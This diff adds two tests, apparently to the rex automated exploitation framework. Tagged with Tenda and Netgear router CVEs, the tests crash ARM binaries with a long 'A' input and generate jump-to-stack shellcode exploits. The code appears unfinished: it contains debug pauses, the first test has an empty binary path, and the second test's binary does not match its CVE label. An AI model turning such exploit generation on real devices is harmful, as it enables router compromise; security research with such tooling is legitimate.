@@ -540,6 +540,47 @@ def test_linux_armel_stacksmash_jump():
         embed()
         payload = exploit.arsenal['call_jmp_sp_shellcode'].dump()
 
+def test_tenda_httpd_stackoverflow():
+    """
+    CVE-2018-16333
+    """
+    path = bin_location
+    bin_path = os.path.join(path, "")
+    ld_path = os.path.join(path, "ld-linux.so.3")
+    libc_path = os.path.join(path,"libc.so.6")
+
+    lib_path = path
+    inp = b"A" * 0x100
+
+    input("Let's go to run "+str(bin_path))
+    with archr.targets.LocalTarget([ld_path, '--library-path', lib_path, bin_path], bin_path, target_arch='arm').build().start() as target:
+        print("Success")
+        crash = rex.Crash(target, inp)
+        exploit = crash.exploit(whitelist_techniques={"call_jmp_sp_shellcode"})
+        embed()
+        payload = exploit.arsenal['call_jmp_sp_shellcode'].dump()
+
+def test_netgear_upnpd_stackoverflow():
+    """
+    CVE-2021-27239
+    """
+    path = bin_location
+    bin_path = os.path.join(path, "vuln_stacksmash_withjump")
+    ld_path = os.path.join(path, "ld-linux.so.3")
+    libc_path = os.path.join(path,"libc.so.6")
+
+    lib_path = path
+    inp = b"A" * 0x100
+
+    input("Let's go to run "+str(bin_path))
+    with archr.targets.LocalTarget([ld_path, '--library-path', lib_path, bin_path], bin_path, target_arch='arm').build().start() as target:
+        print("Success")
+        crash = rex.Crash(target, inp)
+        exploit = crash.exploit(whitelist_techniques={"call_jmp_sp_shellcode"})
+        embed()
+        payload = exploit.arsenal['call_jmp_sp_shellcode'].dump()
+
+
 
 if __name__ == "__main__":
     logging.getLogger("rex").setLevel("DEBUG")
